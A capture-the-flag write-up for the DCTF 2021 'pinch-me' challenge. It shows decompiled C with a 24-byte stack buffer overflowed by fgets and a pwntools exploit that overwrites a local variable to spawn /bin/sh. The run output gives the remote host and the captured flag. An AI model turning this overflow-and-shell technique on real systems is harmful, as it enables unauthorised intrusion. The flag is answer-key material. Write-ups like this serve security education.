


The *vuln* function would spawn a shell if *local_10 == 0x1337c0de*. 

```c
void vuln(void)
{
  char local_28 [24];
  int local_10;
  int local_c;
  
  local_c = 0x1234567;
  local_10 = -0x76543211;
  puts("Is this a real life, or is it just a fanta sea?");
  puts("Am I dreaming?");
  fgets(local_28,100,stdin);
  if (local_10 == 0x1337c0de) {
    system("/bin/sh");
  }
  else {
    if (local_c == 0x1234567) {
      puts("Pinch me!");
    }
    else {
      puts("Pinch me harder!");
    }
  }
  return;
}

```

*local_10* located right after user input array, to call vuln with *local_10* set to *0x1337c0de*, needed to fill the array and append *0x1337c0de* to it, so *local_10* would be overwritten with *0x1337c0de*. Check out [here](https://github.com/onealmond/hacking-lab/blob/master/dctf-2021/pinch-me/exploit.py) for full source code.

```python
payload = b"A"*24
payload += pwn.p64(0x1337c0de)

print(payload, len(payload))
pr.sendafter("dreaming?\n", payload)
pr.sendline()
pr.sendline('cat flag.txt')
print(pr.readall(2))
```

*cat flag.txt* once pwned.

```bash
$ python3 exploit.py 
[+] Opening connection to dctf1-chall-pinch-me.westeurope.azurecontainer.io on port 7480: Done
b'AAAAAAAAAAAAAAAAAAAAAAAA\xde\xc07\x13\x00\x00\x00\x00' 32
[+] Receiving all data: Done (37B)
[*] Closed connection to dctf1-chall-pinch-me.westeurope.azurecontainer.io port 7480
b'dctf{y0u_kn0w_wh4t_15_h4pp3n1ng_b75?}'
```
